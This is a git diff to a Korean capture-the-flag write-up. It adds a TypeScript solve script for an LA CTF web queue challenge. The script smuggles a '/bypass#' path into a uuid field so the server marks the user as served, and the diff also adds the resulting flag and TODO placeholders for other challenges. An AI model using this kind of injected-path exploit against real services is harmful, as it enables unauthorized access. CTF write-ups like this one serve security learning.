@@ -482,10 +482,10 @@ app.get('/api/heartbeat', async (req, res) => {
   res.send('online');
 });
 
-// [!code highlight:8]
 app.get('/api/:uuid/status', async (req, res) => {
   try {
     const user = await Queue.findByPk(req.params.uuid);
+    // [!code highlight]
     res.send(user.served);
   } catch {
     res.send('false');
@@ -498,6 +498,7 @@ app.get('/api/:uuid/bypass', async (req, res) => {
     if (user === undefined) {
       res.send('uuid not found');
     } else {
+      // [!code highlight]
       await user.update({ served: true });
       res.send('bypassed');
     }
@@ -518,11 +519,29 @@ app.get('/api/:uuid/bypass', async (req, res) => {
 
 즉, 위와 같은 형식으로 보내면 `served`가 `true`로 바뀌게 되고 `flag`를 얻을 수 있다.
 
-<!-- TODO: Add exploit code -->
-
 ```typescript
+import { logger } from '@utils';
+import { create } from '@web';
 
+const r = create({
+  baseURL: 'http://localhost:3000',
+  ignoreHttpErrors: true,
+});
+
+await r.post('/');
+
+await r.post('/', {
+  uuid: [`${r.getCookie('uuid')}/bypass#`, ...'1'.repeat(35).split('')],
+});
+
+await r
+  .post('/', {
+    uuid: r.getCookie('uuid'),
+  })
+  .then((res) => logger.flag(res.data));
 ```
+
+`lactf{Byp455in_7he_Qu3u3}`
 
 ## web/hptla (40 solves, 487 points)
 
@@ -534,6 +553,8 @@ I made a new hyper-productive todo list app that limits you to 12 characters per
 
 ### Solution
 
+<!-- TODO: add solution for hptla -->
+
 ## web/zero-trust (24 solves, 488 points)
 
 ### Description
@@ -544,6 +565,12 @@ Note: the flag is in `/flag.txt`
 
 ### Solution
 
+<!-- TODO: add solution for zero-trust -->
+
 # 2024
 
+<!-- TODO: add challenges for 2024 -->
+
 # 2025
+
+<!-- TODO: add challenges for 2025 -->
